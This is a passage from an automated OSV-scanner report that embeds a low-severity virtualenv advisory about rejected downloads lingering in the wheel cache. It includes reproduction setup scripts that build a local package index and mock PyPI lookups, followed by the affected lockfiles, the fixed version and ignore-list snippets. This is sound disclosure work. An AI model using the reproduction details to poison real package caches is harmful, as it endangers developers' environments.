shutil.copy(BUNDLE_FOLDER / filename, index_dir / \"files\")\n\u003e         releases[version] = [{\"filename\": filename, \"digests\": {\"sha256\": sha256}, \"upload_time\": \"2026-01-01T00:00:00\"}]\n\u003e         with zipfile.ZipFile(BUNDLE_FOLDER / filename) as wheel:\n\u003e             metadata = HeaderParser().parsestr(wheel.read(f\"{name}-{version}.dist-info/METADATA\").decode())\n\u003e         requires_python = escape(metadata[\"Requires-Python\"])\n\u003e         links.append(f'\u003ca href=\"/files/{filename}#sha256={sha256}\" data-requires-python=\"{requires_python}\"\u003e{filename}\u003c/a\u003e')\n\u003e     (pypi_dir / f\"{project}.json\").write_text(json.dumps({\"releases\": releases}))\n\u003e     (index_dir / \"simple\" / project).mkdir(parents=True)\n\u003e     (index_dir / \"simple\" / project / \"index.html\").write_text(\"\u003c!DOCTYPE html\u003e\\n\" + \"\\n\".join(links) + \"\\n\")\n\u003e ```\n\u003e \n\u003e **`repro.d/virtualenv_with_local_pypi_json.py`**\n\u003e \n\u003e ```text\n\u003e \"\"\"Setup: the virtualenv command line, with PyPI's JSON API answered from local files because there is no network.\n\u003e \n\u003e usage: virtualenv_with_local_pypi_json.py \u003cpypi_dir\u003e \u003cvirtualenv arguments...\u003e\n\u003e \n\u003e Only the request for https://pypi.org/pypi/\u003cproject\u003e/json is replaced: it is answered from \u003cpypi_dir\u003e/\u003cproject\u003e.json.\n\u003e pip, the index pip talks to and the rest of virtualenv are the real thing.\n\u003e \"\"\"\n\u003e \n\u003e import sys\n\u003e from pathlib import Path\n\u003e from unittest import mock\n\u003e \n\u003e from virtualenv.__main__ import run_with_catch\n\u003e \n\u003e pypi_dir = Path(sys.argv[1])\n\u003e \n\u003e \n\u003e def pypi_json_api(url, context):\n\u003e     assert url.startswith(\"https://pypi.org/pypi/\") and context is None, url\n\u003e     project = url.split(\"/\")[4]\n\u003e     return (pypi_dir / f\"{project}.json\").open(\"rb\")\n\u003e \n\u003e \n\u003e with mock.patch(\"virtualenv.seed.wheels.periodic_update.urlopen\", pypi_json_api):\n\u003e     run_with_catch(sys.argv[2:])\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e A file rejected during download verification can remain available for later cache selection. Exploitation requires\n\u003e additional control over the downloaded data or archive selection; this finding alone does not bypass TLS.\n\u003e \n\u003e Severity: low.\n\u003e \n\u003e ## Versions tested\n\u003e \n\u003e The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected\n\u003e version or exclude earlier releases. Fixed in 21.14.9.\n\u003e \n\u003e The fix downloads into a private temporary directory and verifies archive identity, requested version, digest\n\u003e where applicable, and Python compatibility before promoting a wheel into the reusable cache.\n\u003e \n\u003e Fix: [PR #3430](https://github.com/pypa/virtualenv/pull/3430).\n\u003e \n\u003e ## Known mitigation\n\u003e \n\u003e After a failed verification, discard that download cache before reusing it. Use embedded wheels while reviewing\n\u003e unexpected download failures.\n\u003e \n\u003e ## Affected release\n\u003e \n\u003e - [x] The problem reproduces on virtualenv 21.14.8.\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Reported by Anthropic's OSS Scanner as ANT-2026-ST00DRO3.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | virtualenv | 20.31.2 |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | virtualenv | 21.7.4 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-494p-63j8-28p3 | virtualenv | 21.14.9 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113714\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-113714\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
